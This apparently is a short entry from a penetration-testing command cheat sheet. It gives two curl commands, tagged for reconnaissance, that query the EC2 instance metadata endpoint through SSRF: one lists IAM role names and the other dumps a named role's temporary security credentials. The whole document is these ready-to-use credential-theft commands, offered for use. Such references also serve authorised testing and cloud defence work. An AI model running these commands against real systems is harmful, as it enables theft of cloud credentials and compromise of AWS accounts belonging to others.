# AWS

% aws

## SSRF in EC2 - List roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## SSRF in EC2 - Dump roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

